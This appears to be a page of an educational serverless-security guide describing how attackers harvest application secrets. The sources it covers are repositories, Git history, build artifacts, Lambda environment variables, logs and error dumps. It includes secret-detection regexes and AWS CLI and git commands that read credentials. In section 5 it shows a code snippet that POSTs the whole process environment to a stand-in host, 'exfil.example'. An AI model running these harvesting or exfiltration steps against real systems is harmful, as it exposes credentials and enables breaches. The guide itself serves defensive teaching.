# SAS-7: Insecure Application Secrets Storage - Attack Vectors

## Table of Contents
- [Understanding the Attack Vectors](#understanding-the-attack-vectors)
- [Core Attack Flow](#core-attack-flow)
- [Where Attackers Find Secrets](#where-attackers-find-secrets)
- [Chaining a Secret Into a Breach](#chaining-a-secret-into-a-breach)

## Understanding the Attack Vectors

> **⚠ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find, remove, and rotate exposed secrets in serverless systems you own or are authorised to test.

Attacking insecure secret storage is not about breaking cryptography or finding a clever bug. The secret is already *readable*; the attacker's only job is to look in the places developers routinely leave it. Because a valid credential needs no exploit—it is authenticated access by design—the moment an attacker reads the value, the affected system is compromised.

Serverless widens every one of these places at once. Configuration is code, so secrets reach version control. Functions are numerous, so secrets get copied and over-shared. Third-party dependencies run beside your secrets, so any of them can read the environment. And the platform itself exposes plaintext environment variables through its own APIs. The vectors below are the harvesting paths an attacker walks, from outside the account and from within a compromised function.

### Core Attack Flow

```
1. Locate the store
   |
   Repo, Git history, deploy artifact, function config, or logs
2. Read the secret
   |
   No exploit needed — the value is in plaintext where it was left
3. Authenticate as the application
   |
   Use the DB credential / API key / signing key directly
4. Expand
   |
   Reuse over-shared secrets to pivot; static keys stay valid for months
```

## Where Attackers Find Secrets

### 1. Public and Shared Repositories

The highest-volume vector by far. Attackers (and automated bots) continuously scan public code hosts for freshly committed keys, and reach private repos through leaked tokens, over-broad forks, and departed contributors.

```
# Automated scanners match high-signal patterns the instant a commit lands:
  AKIA[0-9A-Z]{16}            # AWS access key id
  sk_live_[0-9a-zA-Z]{24,}    # Stripe live secret key
  -----BEGIN PRIVATE KEY-----  # embedded private keys
  postgres://user:pass@host    # DB connection strings with inline creds
# A live cloud key found this way is often used within minutes of the push.
```

**Why it works**: Secrets are committed as if they were code, and there is no pre-commit or CI scan to stop them entering a repo that bots are already watching.

### 2. Git History (Even After "Deletion")

Removing a secret in a later commit does not remove it. Attackers specifically read history, not just the current tree.

```
# The current file looks clean, but the secret is one command away:
$ git log -p -- config.js | grep -i "key\|password\|secret"
$ git grep "sk_live_" $(git rev-list --all)
# Every clone, fork, and backup carries the same recoverable history.
```

**Why it works**: History is permanent and distributed. A "fixed" secret that was never rotated is still a live credential sitting in old commits.

### 3. The Deployment Package / Build Artifact

The function's code is downloadable, and build artifacts sit in CI stores. Anything bundled with the code—a stray `.env`, a config file—comes with it.

```
# Pull the function's own code and unpack it:
$ aws lambda get-function --function-name checkout \
    --query 'Code.Location' --output text        # pre-signed download URL
$ curl -s "$URL" -o checkout.zip && unzip -o checkout.zip
$ cat .env                                        # DB_PASSWORD=..., STRIPE=...
# Or pull the same artifact from the CI/build cache.
```

**Why it works**: The artifact is treated as opaque, but it is retrievable, and secrets bundled into it travel wherever it goes.

### 4. Plaintext Environment Variables via the Platform API

If an attacker gains any read access to function configuration—through a leaked credential, an over-broad role (SAS-4), or an SSRF that reaches the control plane—the environment is handed over in plaintext.

```
# One call dumps every env-var secret on the function:
$ aws lambda get-function-configuration --function-name checkout \
    --query 'Environment.Variables'
{
  "DB_PASSWORD": "S3cr3t-prod-pw",
  "STRIPE_SECRET_KEY": "sk_live_51H...redacted"
}
# The permission lambda:GetFunctionConfiguration is often granted far too broadly.
```

**Why it works**: Env vars are stored in plaintext by default, and the read permission is commonly over-granted, so a modest foothold becomes full credential disclosure.

### 5. A Compromised Dependency Reading the Environment

Your function runs every direct and transitive package in the same process as your secrets. A malicious or compromised dependency reads the environment and exfiltrates it—no bug in your own code required (ties to SAS-6 and SAS-10).

```
// Buried in a transitive dependency's post-install or runtime code:
fetch("https://exfil.example/c", {
  method: "POST",
  body: JSON.stringify(process.env)   // ships DB_PASSWORD, STRIPE_KEY, JWT_KEY...
});
# Python equivalent: requests.post(url, json=dict(os.environ))
```

**Why it works**: Secrets kept in the environment are readable by all in-process code. Trusting your own code says nothing about the hundreds of packages beside it.

### 6. Secrets Echoed Into Logs

Debug lines that dump the event or the environment write secrets into CloudWatch, where an attacker with log read access simply reads them back (ties to SAS-5).

```
# A single query over the log group harvests whatever was printed:
$ aws logs filter-log-events --log-group-name /aws/lambda/checkout \
    --filter-pattern "STRIPE_SECRET_KEY"
# Returns the log line where process.env or the raw event was printed.
```

**Why it works**: Logs are durable and often broadly readable; a secret printed once persists for the group's whole retention.

### 7. Exception Dumps and Verbose Errors

Many crash handlers serialize context—including the environment—into the error. A verbose error returned to the caller, or captured by an error-tracking tool, can carry the secret out with it.

```
# An unhandled error whose payload includes the environment:
{
  "errorType": "ConnectionError",
  "context": { "env": { "DB_PASSWORD": "S3cr3t-prod-pw", ... } }
}
# Now the secret is in the response, the error tracker, and the logs at once.
```

**Why it works**: Diagnostics optimise for "include everything," and plaintext env-var secrets are part of "everything."

### 8. Reuse of Over-Shared, Static Secrets

Once any single secret is obtained, over-sharing turns it into a master key. The same value handed to every function—and never rotated—authenticates far beyond the one place it belonged.

```
# One harvested DB credential, reused everywhere it was copied:
  checkout-fn   -> same DB_PASSWORD
  reports-fn    -> same DB_PASSWORD
  admin-fn      -> same DB_PASSWORD
# Compromising the least-important function yields the credential for all of them,
# and because it is static, last year's leak still works today.
```

**Why it works**: No per-function scoping means no blast-radius limit, and no rotation means no expiry on a leak.

## Chaining a Secret Into a Breach

Individually small exposures combine into a full compromise because the secret is the access, and nothing downstream expires it:

```
SSRF / over-broad read        -> call GetFunctionConfiguration
        +
Plaintext env-var secrets      -> read DB_PASSWORD + STRIPE_SECRET_KEY directly
        +
Over-shared, static creds      -> same DB credential authenticates to prod DB
        +
No rotation                    -> the credential is still valid; access persists
        =  full database + payment-provider compromise, no exploit required
```

The supply-chain variant needs no account access at all:

```
Malicious dependency added     -> runs in the function's process
        -> reads process.env / os.environ (plaintext secrets live there)
        -> POSTs every secret to an attacker endpoint
        -> attacker authenticates to each downstream system in turn
        =  breach that never touched your code or your cloud console
```

## Key Takeaways

1. **The secret is the exploit**—a valid credential needs no vulnerability; reading it is the whole attack.
2. **Repos and history are the top vector**—committed secrets are found by bots fast, and deleting the line does not remove them.
3. **The platform exposes env vars**—`GetFunctionConfiguration`, the console, logs, and error dumps all reveal plaintext environment variables.
4. **Every dependency can read your secrets**—in-process, in-environment secrets are readable by all the code the function runs.
5. **Over-sharing and no rotation amplify everything**—one leaked static secret becomes lasting, wide access.

## Next Steps

- **[Prevention Guide](prevention.md)**: Store secrets in a managed store, fetch at runtime, scope and rotate them
- **[Code Examples](examples.md)**: Vulnerable vs. secure secret handling in Lambda and serverless.yml
- **[Overview](overview.md)**: Why serverless secrets leak so easily
